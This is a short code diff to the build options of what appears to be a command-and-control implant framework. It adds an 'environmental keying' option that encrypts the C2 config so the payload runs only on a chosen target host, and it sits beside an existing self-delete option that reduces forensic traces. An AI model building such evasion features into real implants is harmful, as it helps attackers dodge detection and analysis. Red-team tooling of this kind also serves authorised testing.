@@ -197,6 +197,14 @@ var payloadDefinition = agentstructs.PayloadType{
 			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
 		},
 		{
+			Name:          "env_key_derive",
+			Description:   "Environmental keying: encrypt C2 config with a key derived from the target host's properties. The payload only decrypts on the correct host — wrong host = silent exit, no C2 config in binary. Requires the corresponding env_key_* values to be set with EXACT values (not regex). Stronger than env_key match alone (config is AES-encrypted, not just checked).",
+			Required:      false,
+			DefaultValue:  "",
+			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_CHOOSE_ONE,
+			Choices:       []string{"", "hostname", "domain", "username", "hostname+domain", "hostname+domain+username"},
+		},
+		{
 			Name:          "self_delete",
 			Description:   "Delete the agent binary from disk after execution starts. Reduces forensic artifacts. On Linux/macOS, the file is removed immediately (process continues from memory). On Windows, uses NTFS stream rename technique.",
 			Required:      false,
